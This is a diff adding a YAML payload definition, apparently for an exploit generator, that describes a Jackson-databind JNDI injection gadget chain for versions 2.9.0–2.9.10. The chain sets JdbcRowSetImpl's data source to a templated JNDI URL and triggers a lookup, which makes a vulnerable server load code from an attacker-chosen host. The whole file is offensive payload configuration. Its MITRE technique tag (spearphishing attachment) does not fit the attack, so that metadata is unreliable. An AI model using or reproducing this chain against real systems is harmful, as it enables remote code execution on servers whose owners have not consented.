@@ -1,0 +1,26 @@
+name: "JacksonJndiInjection"
+category: "jackson"
+description: "Jackson JNDI injection gadget chain via JNDI lookup"
+jdk_version: "all"
+dependencies:
+  - name: "jackson-databind"
+    version: "2.9.0-2.9.10"
+exploit_type: "jndi_injection"
+payload_type: "jndi"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/FasterXML/jackson-databind/issues"
+steps:
+  - class_name: "com.sun.rowset.JdbcRowSetImpl"
+    method_name: "setDataSourceName"
+    parameters:
+      - "{jndi_url}"
+  - class_name: "com.sun.rowset.JdbcRowSetImpl"
+    method_name: "setAutoCommit"
+    parameters:
+      - "true"
+  - class_name: "javax.naming.InitialContext"
+    method_name: "lookup"
+    parameters:
+      - "{jndi_url}"
